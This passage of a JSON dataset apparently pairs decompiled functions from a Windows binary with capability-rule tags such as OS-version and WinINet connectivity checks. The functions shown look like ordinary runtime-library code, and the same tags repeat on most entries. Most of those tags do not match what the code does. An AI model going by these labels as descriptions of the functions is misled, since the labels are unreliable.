            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl\nfcn.0045e9cc(int32_t arg_8h, int32_t arg_ch, int32_t arg_10h, int32_t arg_14h, int32_t arg_18h, int32_t arg_1ch, \n            uint arg_20h, uint32_t arg_24h, uint noname_8, uint arg_2ch, int32_t arg_30h)\n\n{\n    int32_t arg_8h_00;\n    uint uVar1;\n    uint32_t in_ECX;\n    uint arg_28h;\n    int32_t var_8h;\n    uint32_t var_4h;\n    \n    if (arg_ch == 0) {\n        *(arg_30h + 0x1c) = 1;\n        *(arg_30h + 0x18) = 0x16;\n    }\n    else if ((arg_10h == 0) || (arg_14h == 0)) {\n        *(arg_30h + 0x1c) = 1;\n        *(arg_30h + 0x18) = 0x16;\n    }\n    else {\n        if (arg_18h != 0) {\n            var_4h = in_ECX;\n            if ((((arg_1ch == 0x41) || (arg_1ch == 0x45)) || (arg_1ch == 0x46)) ||\n               (var_4h = in_ECX & 0xffffff00,  arg_1ch == 0x47)) {\n                var_4h = CONCAT31(var_4h._1_3_, 1);\n            }\n            if (((arg_24h & 8) == 0) && (arg_8h_00 = fcn.0045dfd0(arg_8h),  arg_8h_00 != 0)) {\n                var_8h._1_3_ = in_ECX >> 8;\n                if ((*(arg_8h + 4) < 1) && (*(arg_8h + 4) < 0)) {\n                    var_8h = CONCAT31(var_8h._1_3_, 1);\n                }\n                else {\n                    var_8h = var_8h._1_3_ << 8;\n                }\n                uVar1 = fcn.0045e865(arg_8h_00, var_8h, arg_ch, arg_10h, var_4h);\n                return uVar1;\n            }\n            if ((arg_24h & 0x10) == 0) {\n                uVar1 = 2;\n            }\n            else {\n                uVar1 = 3;\n            }\n            arg_28h = 0;\n            if ((arg_24h & 0x20) != 0) {\n                arg_28h = arg_2ch;\n            }\n            if (arg_1ch < 0x62) {\n                if ((arg_1ch == 0x61) || (arg_1ch == 0x41)) {\n                    uVar1 = fcn.0045e0ee(arg_8h, arg_ch, arg_10h, arg_14h, arg_18h, arg_20h, var_4h, uVar1, arg_28h, \n                                         arg_30h);\n                    return uVar1;\n                }\n                arg_1ch = arg_1ch + -0x45;\n            }\n            else {\n                arg_1ch = arg_1ch + -0x65;\n            }\n            if (arg_1ch == 0) {\n                uVar1 = fcn.0045e41b(arg_8h, arg_ch, arg_10h, arg_14h, arg_18h, arg_20h, var_4h, uVar1, arg_28h, arg_30h\n                                    );\n                return uVar1;\n            }\n            if (arg_1ch != 1) {\n                uVar1 = fcn.0045e796(arg_8h, arg_ch, arg_10h, arg_14h, arg_18h, arg_20h, var_4h, uVar1, arg_28h, arg_30h\n                                    );\n                return uVar1;\n            }\n            uVar1 = fcn.0045e612(arg_8h, arg_ch, arg_10h, arg_14h, arg_18h, arg_20h, arg_28h, arg_30h);\n            return uVar1;\n        }\n        *(arg_30h + 0x1c) = 1;\n        *(arg_30h + 0x18) = 0x16;\n    }\n    fcn.0043bac1(0, 0, 0, 0, 0, arg_30h);\n    return 0x16;\n}\n",
        "token_count": 1088
    },
    "0045eb4d": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0045eb4d(uint arg_8h)\n\n{\n    uint *in_ECX;\n    \n    if (*(in_ECX + 1) != '\\0') {\n        arg_8h = *in_ECX;\n    }\n    return arg_8h;\n}\n",
        "token_count": 63
    },
    "0045eb63": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0045eb63(int32_t *arg_8h, uchar *arg_ch, uint32_t arg_10h, uint32_t arg_14h, int32_t arg_18h)\n\n{\n    int32_t arg_14h_00;\n    int32_t iVar1;\n    uint uVar2;\n    uint var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    arg_14h_00 = arg_18h;\n    if ((arg_ch == NULL) && (arg_10h != 0)) {\n        if (arg_8h == NULL) {\n            return 0;\n        }\n        *arg_8h = 0;\n        return 0;\n    }\n    if (arg_8h != NULL) {\n        *arg_8h = -1;\n    }\n    if (arg_10h < 0x80000000) {\n        if (*(arg_18h + 0x14) == '\\0') {\n            fcn.00453bd0();\n        }\n        var_8h = *(*(arg_14h_00 + 0xc) + 8);\n        if (var_8h == 0xfde9) {\n            var_ch = 0;\n            var_8h = 0;\n            iVar1 = fcn.0046cc49(arg_ch, arg_14h & 0xffff, &var_ch, arg_14h_00);\n            if (arg_8h != NULL) {\n                *arg_8h = iVar1;\n            }\n            if (iVar1 < 5) {\n                return 0;\n            }\n            if (*(arg_14h_00 + 0x1c) != '\\0') {\n                return *(arg_14h_00 + 0x18);\n            }\n            return 0;\n        }\n        if (*(*(arg_14h_00 + 0xc) + 0xa8) == 0) {\n            var_4h = 0xff;\n            if (0xff < arg_14h) {\n                if ((arg_ch != NULL) && (arg_10h != 0)) {\n                    fcn.00431db0(arg_ch, 0, arg_10h);\n                }\n                goto code_r0x0045ec36;\n            }\n            if (arg_ch == NULL) {\ncode_r0x0045ec4f:\n                if (arg_8h != NULL) {\n                    *arg_8h = 1;\n                }\n                return 0;\n            }\n            if (arg_10h != 0) {\n                *arg_ch = arg_14h;\n                goto code_r0x0045ec4f;\n            }\n        }\n        else {\n            var_4h = 0;\n            iVar1 = fcn.00463192(var_8h, 0, &arg_14h, 1, arg_ch, arg_10h, 0, &var_4h);\n            if (iVar1 != 0) {\n                if (var_4h == 0) {\n                    if (arg_8h == NULL) {\n                        return 0;\n                    }\n                    *arg_8h = iVar1;\n                    return 0;\n                }\ncode_r0x0045ec36:\n                *(arg_14h_00 + 0x18) = 0x2a;\n                *(arg_14h_00 + 0x1c) = 1;\n                return 0x2a;\n            }\n            iVar1 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n            if (iVar1 != 0x7a) goto code_r0x0045ec36;\n            if ((arg_ch != NULL) && (arg_10h != 0)) {\n                fcn.00431db0(arg_ch, 0, arg_10h);\n            }\n        }\n        uVar2 = 0x22;\n    }\n    else {\n        uVar2 = 0x16;\n    }\n    *(arg_14h_00 + 0x18) = uVar2;\n    *(arg_14h_00 + 0x1c) = 1;\n    fcn.0043bac1(0, 0, 0, 0, 0, arg_14h_00);\n    return uVar2;\n}\n",
        "token_count": 947
    },
    "0045eccd": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.0045eccd(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint var_2ch;\n    int32_t var_20h;\n    uint var_18h;\n    uint var_4h;\n    \n    fcn.0043b732(arg_10h);\n    var_4h = 0;\n    if (var_18h == '\\0') {\n        fcn.00453bd0();\n    }\n    iVar1 = fcn.0045eb63(&var_4h, arg_8h, *(var_20h + 4), arg_ch, &var_2ch);\n    uVar2 = var_4h;\n    if (iVar1 != 0) {\n        uVar2 = 0xffffffff;\n    }\n    fcn.0043b78b();\n    return uVar2;\n}\n",
        "token_count": 215
    },
    "0045ee07": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0045ee07(uint16_t *arg_8h, uint8_t *arg_ch, uint32_t arg_10h, int32_t arg_14h)\n\n{\n    int32_t *piVar1;\n    int32_t arg_14h_00;\n    int32_t iVar2;\n    uint var_4h;\n    \n    if ((arg_ch == NULL) || (arg_10h == 0)) {\n        *0x6cd60c = 0;\n        *0x6cd610 = 0;\n    }\n    else {\n        if (*arg_ch != 0) {\n            if (*(arg_14h + 0x14) == '\\0') {\n                fcn.00453bd0();\n            }\n            piVar1 = *(arg_14h + 0xc);\n            iVar2 = piVar1[2];\n            if (iVar2 == 0xfde9) {\n                iVar2 = fcn.0046cd5c(arg_8h, arg_ch, arg_10h, 0x6cd60c, arg_14h);\n                if (-1 < iVar2) {\n                    return iVar2;\n                }\n            }\n            else {\n                if (piVar1[0x2a] == 0) {\n                    if (arg_8h != NULL) {\n                        *arg_8h = *arg_ch;\n                    }\n                    return 1;\n                }\n                if (*(*piVar1 + *arg_ch * 2) < 0) {\n                    arg_14h_00 = *(*(arg_14h + 0xc) + 4);\n                    if ((((1 < arg_14h_00) && (arg_14h_00 <= arg_10h)) &&\n                        (iVar2 = fcn.004630d8(iVar2, 9, arg_ch, arg_14h_00, arg_8h, arg_8h != NULL),  iVar2 != 0)) ||\n                       ((*(*(arg_14h + 0xc) + 4) <= arg_10h && (arg_ch[1] != 0)))) {\n                        return *(*(arg_14h + 0xc) + 4);\n                    }\n                }\n                else {\n                    iVar2 = fcn.004630d8(iVar2, 9, arg_ch, 1, arg_8h, arg_8h != NULL);\n                    if (iVar2 != 0) {\n                        return 1;\n                    }\n                }\n                *(arg_14h + 0x1c) = 1;\n                *(arg_14h + 0x18) = 0x2a;\n            }\n            return -1;\n        }\n        if (arg_8h != NULL) {\n            *arg_8h = 0;\n        }\n    }\n    return 0;\n}\n",
        "token_count": 619
    },
    "0045f756": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0045f756(int32_t *arg_8h)\n\n{\n    uint32_t *puVar1;\n    char cVar2;\n    int32_t *piVar3;\n    int32_t iVar4;\n    \n    cVar2 = fcn.0045f718(arg_8h);\n    if (cVar2 != '\\0') {\n        piVar3 = fcn.0045f0eb(1);\n        if (arg_8h == piVar3) {\n            piVar3 = 0x6cd624;\n        }\n        else {\n            piVar3 = fcn.0045f0eb(2);\n            if (arg_8h != piVar3) {\n                return 0;\n            }\n            piVar3 = 0x6cd628;\n        }\n        *0x6cd61c = *0x6cd61c + 1;\n        puVar1 = arg_8h + 3;\n        if ((*puVar1 & 0x4c0) == 0) {\n            LOCK();\n            *puVar1 = *puVar1 | 0x282;\n            if (*piVar3 == 0) {\n                iVar4 = fcn.0045d1bf(0x1000);\n                *piVar3 = iVar4;\n                fcn.0045d185(0);\n            }\n            if (*piVar3 == 0) {\n                arg_8h[2] = 2;\n                arg_8h[1] = arg_8h + 5;\n                *arg_8h = arg_8h + 5;\n                arg_8h[6] = 2;\n            }\n            else {\n                arg_8h[1] = *piVar3;\n                *arg_8h = *piVar3;\n                arg_8h[2] = 0x1000;\n                arg_8h[6] = 0x1000;\n            }\n            return 1;\n        }\n    }\n    return 0;\n}\n",
        "token_count": 444
    },
    "0045f917": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nvoid fcn.0045f917(void)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint uVar5;\n    \n    uVar4 = 0;\n    do {\n        iVar3 = (uVar4 & 0x3f) * 0x38 + *((uVar4 >> 6) * 4 + 0x6cd630);\n        if ((*(iVar3 + 0x18) == -1) || (*(iVar3 + 0x18) == -2)) {\n            *(iVar3 + 0x28) = 0x81;\n            if (uVar4 == 0) {\n                uVar5 = 0xfffffff6;\n            }\n            else if (uVar4 == 1) {\n                uVar5 = 0xfffffff5;\n            }\n            else {\n                uVar5 = 0xfffffff4;\n            }\n            iVar1 = (*_sym.imp.KERNEL32.dll_GetStdHandle)(uVar5);\n            if ((iVar1 != -1) && (iVar1 != 0)) {\n                uVar2 = (*_sym.imp.KERNEL32.dll_GetFileType)(iVar1);\n                if (uVar2 != 0) {\n                    *(iVar3 + 0x18) = iVar1;\n                    if ((uVar2 & 0xff) == 2) {\n                        *(iVar3 + 0x28) = *(iVar3 + 0x28) | 0x40;\n                    }\n                    else if ((uVar2 & 0xff) == 3) {\n                        *(iVar3 + 0x28) = *(iVar3 + 0x28) | 8;\n                    }\n                    goto code_r0x0045f9b9;\n                }\n            }\n            *(iVar3 + 0x28) = *(iVar3 + 0x28) | 0x40;\n            *(iVar3 + 0x18) = 0xfffffffe;\n            if (*0x6cd618 != 0) {\n                *(*(*0x6cd618 + uVar4 * 4) + 0x10) = 0xfffffffe;\n            }\n        }\n        else {\n            *(iVar3 + 0x28) = *(iVar3 + 0x28) | 0x80;\n        }\ncode_r0x0045f9b9:\n        uVar4 = uVar4 + 1;\n        if (uVar4 == 3) {\n            return;\n        }\n    } while( true );\n}\n",
        "token_count": 562
    },
    "00460c36": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00460c36(int32_t arg_8h)\n\n{\n    char cVar1;\n    int32_t var_4h;\n    \n    if (*0x6cda74 == 0) {\n        var_4h = arg_8h;\n        cVar1 = fcn.00460c23();\n        if (cVar1 == '\\0') {\n            fcn.00460272(&var_4h);\n        }\n        *0x6cda74 = (var_4h == 1) + 1;\n    }\n    return;\n}\n",
        "token_count": 128
    },
    "00460c73": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00460c73(int32_t arg_8h)\n\n{\n    char cVar1;\n    int32_t var_4h;\n    \n    if (*0x6cda78 == 0) {\n        var_4h = arg_8h;\n        cVar1 = fcn.00460c23();\n        if (cVar1 == '\\0') {\n            fcn.00460232(&var_4h);\n        }\n        *0x6cda78 = (var_4h == 1) + 1;\n    }\n    return;\n}\n",
        "token_count": 128
    },
    "00460d0a": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nbool __cdecl fcn.00460d0a(int32_t arg_8h)\n\n{\n    char cVar1;\n    int32_t var_4h;\n    \n    var_4h = arg_8h;\n    cVar1 = fcn.00460c23();\n    if (cVar1 == '\\0') {\n        fcn.004601f2(&var_4h);\n    }\n    return var_4h != 1;\n}\n",
        "token_count": 99
    },
    "00460dcf": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.00460dcf(void)\n\n{\n    char cVar1;\n    int32_t var_4h;\n    \n    if (*0x6cda74 == 0) {\n        var_4h = 0;\n        cVar1 = fcn.00460c23();\n        if (cVar1 == '\\0') {\n            fcn.00460272(&var_4h);\n        }\n        *0x6cda74 = (var_4h == 1) + 1;\n    }\n    return;\n}\n",
        "token_count": 118
    },
    "00460e09": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.00460e09(void)\n\n{\n    char cVar1;\n    int32_t var_4h;\n    \n    if (*0x6cda78 == 0) {\n        var_4h = 1;\n        cVar1 = fcn.00460c23();\n        if (cVar1 == '\\0') {\n            fcn.00460232(&var_4h);\n        }\n        *0x6cda78 = (var_4h == 1) + 1;\n    }\n    return;\n}\n",
        "token_count": 118
    },
    "00460e47": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nbool fcn.00460e47(void)\n\n{\n    char cVar1;\n    int32_t var_4h;\n    \n    var_4h = 0;\n    cVar1 = fcn.00460c23();\n    if (cVar1 == '\\0') {\n        fcn.004601f2(&var_4h);\n    }\n    return var_4h != 1;\n}\n",
        "token_count": 88
    },
    "00461827": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_264h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.00461827(uint16_t *arg_8h, uint16_t *arg_ch, int32_t *arg_10h)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint16_t *extraout_EDX;\n    uint64_t uVar5;\n    int32_t var_264h;\n    uint var_260h;\n    uint var_25ch;\n    uint var_255h;\n    uint var_228h;\n    int16_t var_224h;\n    uint32_t var_4h;\n    \n    var_4h = *0x6cade0 ^ &stack0xfffffffc;\n    if (arg_ch != arg_8h) {\n        do {\n            cVar1 = fcn.00461cc7(*arg_ch);\n            arg_ch = extraout_EDX;\n            if (cVar1 != '\\0') break;\n            arg_ch = extraout_EDX + -1;\n        } while (arg_ch != arg_8h);\n    }\n    if ((*arg_ch != 0x3a) || (arg_ch == arg_8h + 1)) {\n        uVar5 = fcn.00461cc7(*arg_ch);\n        iVar2 = (*_sym.imp.KERNEL32.dll_FindFirstFileExW)(arg_8h, 0, &var_255h + 1, 0, 0, 0);\n        if (iVar2 != -1) {\n            iVar3 = arg_10h[1] - *arg_10h >> 2;\n            do {\n                if (((var_228h != 0x2e) || ((var_228h._2_2_ != 0 && ((var_228h._2_2_ != 0x2e || (var_224h != 0)))))) &&\n                   (var_264h = fcn.004614ee(&var_228h, arg_8h, \n                                            -((uVar5 & 0xff) != 0) & ((uVar5 >> 0x20) - arg_8h >> 1) + 1U, arg_10h), \n                   var_264h != 0)) {\n                    (*_sym.imp.KERNEL32.dll_FindClose)(iVar2);\n                    goto code_r0x0046198e;\n                }\n                iVar4 = (*_sym.imp.KERNEL32.dll_FindNextFileW)(iVar2, &var_255h + 1);\n            } while (iVar4 != 0);\n            iVar4 = arg_10h[1] - *arg_10h >> 2;\n            if (iVar3 != iVar4) {\n                fcn.0046dc20(*arg_10h + iVar3 * 4, iVar4 - iVar3, 4, fcn.00460f3e);\n            }\n            (*_sym.imp.KERNEL32.dll_FindClose)(iVar2);\n            goto code_r0x0046198e;\n        }\n    }\n    fcn.004614ee(arg_8h, 0, 0, arg_10h);\ncode_r0x0046198e:\n    fcn.004303e9(var_264h);\n    return;\n}\n",
        "token_count": 735
    },
    "00461b27": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00461b27(int32_t *arg_8h)\n\n{\n    int32_t *arg_ch;\n    uint32_t uVar1;\n    int32_t iVar2;\n    int32_t *in_ECX;\n    int32_t iVar3;\n    \n    *(in_ECX + 3) = 0;\n    arg_ch = in_ECX + 1;\n    if (arg_8h == NULL) {\n        iVar2 = *0x6caf00;\n        iVar3 = *0x6caf04;\n        if (*0x6cd5fc != 0) {\n            iVar2 = fcn.0045ce63();\n            *in_ECX = iVar2;\n            *arg_ch = *(iVar2 + 0x4c);\n            in_ECX[2] = *(iVar2 + 0x48);\n            fcn.0045df14(iVar2, arg_ch);\n            fcn.0045df72(*in_ECX, in_ECX + 2);\n            uVar1 = *(*in_ECX + 0x350);\n            if ((uVar1 & 2) != 0) {\n                return;\n            }\n            *(*in_ECX + 0x350) = uVar1 | 2;\n            *(in_ECX + 3) = 1;\n            return;\n        }\n    }\n    else {\n        iVar2 = *arg_8h;\n        iVar3 = arg_8h[1];\n    }\n    *arg_ch = iVar2;\n    in_ECX[2] = iVar3;\n    return;\n}\n",
        "token_count": 343
    },
    "00462763": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t fcn.00462763(uint param_1, char param_2, int32_t param_3, uint *param_4)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    int32_t iVar4;\n    uint *puVar5;\n    uint *puVar6;\n    uint auStack584 [137];\n    uint *puStack36;\n    uint *puStack32;\n    int32_t iStack28;\n    uint *puStack20;\n    \n    fcn.004628b8(param_3, param_4);\n    iStack28 = fcn.004624ce(param_1);\n    if (iStack28 == *(*(param_3 + 0x48) + 4)) {\n        iVar2 = 0;\n    }\n    else {\n        puVar3 = fcn.0045d1bf(0x220);\n        iVar2 = iStack28;\n        puStack20 = puVar3;\n        if (puVar3 == NULL) {\n            fcn.0045d185(0);\n            iVar2 = -1;\n        }\n        else {\n            puVar5 = *(param_3 + 0x48);\n            puVar6 = auStack584;\n            for (iVar4 = 0x88; iVar4 != 0; iVar4 = iVar4 + -1) {\n                *puVar6 = *puVar5;\n                puVar5 = puVar5 + 1;\n                puVar6 = puVar6 + 1;\n            }\n            puVar5 = auStack584;\n            puVar6 = puVar3;\n            for (iVar4 = 0x88; iVar4 != 0; iVar4 = iVar4 + -1) {\n                *puVar6 = *puVar5;\n                puVar5 = puVar5 + 1;\n                puVar6 = puVar6 + 1;\n            }\n            *puVar3 = 0;\n            iVar2 = fcn.00462a15(iVar2, puVar3);\n            if (iVar2 == -1) {\n                puVar3 = fcn.0043bcb5();\n                *puVar3 = 0x16;\n                fcn.0045d185(puStack20);\n                iVar2 = -1;\n            }\n            else {\n                if (param_2 == '\\0') {\n                    fcn.0045945f();\n                }\n                piVar1 = *(param_3 + 0x48);\n                LOCK();\n                iVar4 = *piVar1;\n                *piVar1 = *piVar1 + -1;\n                if ((iVar4 == 1) && (*(param_3 + 0x48) != 0x6caff0)) {\n                    fcn.0045d185(*(param_3 + 0x48));\n                }\n                *puStack20 = 1;\n                *(param_3 + 0x48) = puStack20;\n                if ((*(param_3 + 0x350) & *0x6cb574) == 0) {\n                    puStack36 = &param_3;\n                    puStack32 = &param_4;\n                    iStack28 = 5;\n                    puStack20 = 0x5;\n                    fcn.0046232a(&puStack20, &puStack36);\n                    if (param_2 != '\\0') {\n                        *0x6caf04 = *param_4;\n                    }\n                }\n                fcn.0045d185(0);\n            }\n        }\n    }\n    return iVar2;\n}\n",
        "token_count": 778
    },
    "00462a15": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_24h\n// WARNING: Variable defined which should be unmapped: var_20h\n// WARNING: Variable defined which should be unmapped: var_1ch\n\nvoid __cdecl fcn.00462a15(uint arg_8h, int32_t arg_ch)\n\n{\n    uint8_t uVar1;\n    ushort uVar2;\n    uint32_t arg_8h_00;\n    uint32_t uVar3;\n    int32_t iVar4;\n    uint *puVar5;\n    uint uVar6;\n    ushort *puVar7;\n    uint8_t *puVar8;\n    ushort *puVar9;\n    uint unaff_EBX;\n    uint8_t *puVar10;\n    uint unaff_ESI;\n    uint unaff_EDI;\n    uint32_t uVar11;\n    int32_t var_24h;\n    uint var_20h;\n    uint8_t *var_1ch;\n    int32_t lpCPInfo;\n    uint var_12h;\n    uint32_t var_4h;\n    \n    var_4h = *0x6cade0 ^ &stack0xfffffffc;\n    arg_8h_00 = fcn.004624ce(arg_8h);\n    if (arg_8h_00 != 0) {\n        uVar11 = 0;\n        uVar3 = 0;\n        var_1ch = NULL;\ncode_r0x00462a4c:\n        if (*(uVar3 + 0x6cb420) != arg_8h_00) goto code_r0x00462a58;\n        fcn.00431db0(arg_ch + 0x18, 0, 0x101);\n        var_24h = var_1ch * 0x30;\n        var_1ch = var_24h + 0x6cb430;\n        do {\n            uVar1 = *var_1ch;\n            puVar8 = var_1ch;\n            while ((uVar1 != 0 && (puVar8[1] != 0))) {\n                uVar3 = *puVar8;\n                if (uVar3 <= puVar8[1]) {\n                    puVar10 = arg_ch + 0x19 + uVar3;\n                    do {\n                        if (0xff < uVar3) break;\n                        *puVar10 = *puVar10 | *(uVar11 + 0x6cb418);\n                        uVar3 = uVar3 + 1;\n                        puVar10 = puVar10 + 1;\n                    } while (uVar3 <= puVar8[1]);\n                }\n                puVar8 = puVar8 + 2;\n                uVar1 = *puVar8;\n            }\n            uVar11 = uVar11 + 1;\n            var_1ch = var_1ch + 8;\n        } while (uVar11 < 4);\n        *(arg_ch + 4) = arg_8h_00;\n        *(arg_ch + 8) = 1;\n        uVar6 = fcn.0046248a(arg_8h_00);\n        *(arg_ch + 0x21c) = uVar6;\n        puVar7 = arg_ch + 0xc;\n        puVar9 = var_24h + 0x6cb424;\n        iVar4 = 6;\n        do {\n            uVar2 = *puVar9;\n            puVar9 = puVar9 + 1;\n            *puVar7 = uVar2;\n            puVar7 = puVar7 + 1;\n            iVar4 = iVar4 + -1;\n        } while (iVar4 != 0);\n        goto code_r0x00462bfa;\n    }\ncode_r0x00462c02:\n    fcn.0046255b(arg_ch);\ncode_r0x00462c0b:\n    fcn.004303e9(var_24h);\n    return;\ncode_r0x00462a58:\n    var_1ch = var_1ch + 1;\n    uVar3 = uVar3 + 0x30;\n    if (0xef < uVar3) goto code_r0x00462a66;\n    goto code_r0x00462a4c;\ncode_r0x00462a66:\n    if ((arg_8h_00 == 65000) || (iVar4 = (*_sym.imp.KERNEL32.dll_IsValidCodePage)(arg_8h_00 & 0xffff),  iVar4 == 0))\n    goto code_r0x00462c0b;\n    if (arg_8h_00 == 0xfde9) {\n        *(arg_ch + 4) = 0xfde9;\n        *(arg_ch + 0x21c) = 0;\n        *(arg_ch + 0x18) = 0;\n        *(arg_ch + 0x1c) = 0;\n    }\n    else {\n        iVar4 = (*_sym.imp.KERNEL32.dll_GetCPInfo)(arg_8h_00, &lpCPInfo);\n        if (iVar4 == 0) {\n            if (*0x6cda8c == 0) goto code_r0x00462c0b;\n            goto code_r0x00462c02;\n        }\n        fcn.00431db0(arg_ch + 0x18, 0, 0x101);\n        *(arg_ch + 4) = arg_8h_00;\n        *(arg_ch + 0x21c) = 0;\n        if (lpCPInfo == 2) {\n            puVar5 = &var_12h;\n            while ((var_12h != 0 && (uVar1 = *(puVar5 + 1),  uVar1 != 0))) {\n                uVar3 = *puVar5;\n                if (uVar3 <= uVar1) {\n                    puVar8 = arg_ch + 0x19 + uVar3;\n                    iVar4 = (uVar1 - uVar3) + 1;\n                    do {\n                        *puVar8 = *puVar8 | 4;\n                        puVar8 = puVar8 + 1;\n                        iVar4 = iVar4 + -1;\n                    } while (iVar4 != 0);\n                }\n                puVar5 = puVar5 + 2;\n                var_12h._0_1_ = *puVar5;\n            }\n            puVar8 = arg_ch + 0x1a;\n            iVar4 = 0xfe;\n            do {\n                *puVar8 = *puVar8 | 8;\n                puVar8 = puVar8 + 1;\n                iVar4 = iVar4 + -1;\n            } while (iVar4 != 0);\n            uVar6 = fcn.0046248a(*(arg_ch + 4));\n            *(arg_ch + 0x21c) = uVar6;\n            uVar11 = 1;\n        }\n    }\n    *(arg_ch + 8) = uVar11;\n    *(arg_ch + 0xc) = 0;\n    *(arg_ch + 0x10) = 0;\n    *(arg_ch + 0x14) = 0;\ncode_r0x00462bfa:\n    fcn.004625be(arg_ch, unaff_EDI, unaff_ESI, unaff_EBX, var_24h, arg_8h_00, var_1ch);\n    goto code_r0x00462c0b;\n}\n",
        "token_count": 1644
    },
    "00462c9b": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
